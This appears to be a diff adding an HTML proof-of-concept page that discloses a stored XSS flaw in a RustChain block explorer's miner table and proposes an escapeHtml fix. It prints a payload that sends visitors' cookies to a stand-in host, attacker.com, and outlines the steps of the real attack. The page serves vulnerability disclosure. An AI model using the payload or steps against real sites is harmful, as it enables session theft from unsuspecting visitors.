@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>XSS via Miner ID — Enhanced Explorer</title></head>
+<body style="background:#0a0a0f;color:#e2e2f0;font-family:monospace;padding:2rem">
+<h1 style="color:#f97316">Vulnerability #1: Stored XSS via Miner ID</h1>
+
+<p>The enhanced-explorer.html renders <code>miner.miner_id</code> directly into
+innerHTML without <code>escapeHtml()</code>:</p>
+
+<pre style="background:#12121e;padding:1rem;border-radius:4px;color:#c9a227">
+overviewTable.innerHTML = minerList.map(miner => `
+    &lt;td&gt;&lt;strong&gt;${miner.miner_id}&lt;/strong&gt;&lt;/td&gt;  ← UNSAFE
+`).join('');
+</pre>
+
+<p>A malicious miner registers with ID containing:</p>
+
+<pre style="background:#12121e;padding:1rem;border-radius:4px;color:#f87171">
+&lt;img src=x onerror="fetch('https://attacker.com/steal?miner='+document.cookie)"&gt;
+</pre>
+
+<p>When viewed in the explorer, the onerror fires immediately.</p>
+
+<h2 style="color:#ef4444;margin-top:2rem">⚠️ Note</h2>
+<p>This PoC simulates the vulnerability locally. The real attack requires:</p>
+<ol>
+  <li>Register a malicious miner with the RustChain agent registration API</li>
+  <li>Wait for the explorer's refresh cycle to pick up the new miner</li>
+  <li>When anyone visits the Miners tab — XSS fires</li>
+</ol>
+
+<p>Fix: Add <code>escapeHtml(miner.miner_id)</code> in all innerHTML template literals.</p>
+
+<script>
+// Simulate what the vulnerable code does:
+const miner = {
+  miner_id: '<img src=x onerror=alert("Stored XSS via miner_id! Your session: "+document.cookie)>',
+  architecture: 'G4',
+  wallet: 'C4c7r9WPsnEe6CUfegMU9M7ReHD1pWg8qeSfTBoRcLbg'
+};
+
+// This is what the vulnerable enhanced-explorer.html does:
+document.write(`
+  <div style="background:#12121e;border:1px solid #2a2a45;padding:1rem;margin:1rem 0">
+    <h3>Miners Table (SIMULATED)</h3>
+    <strong>${miner.miner_id}</strong><br>
+    Arch: ${miner.architecture}<br>
+    Wallet: ${miner.wallet}
+  </div>
+`);
+</script>
+</body>
+</html>
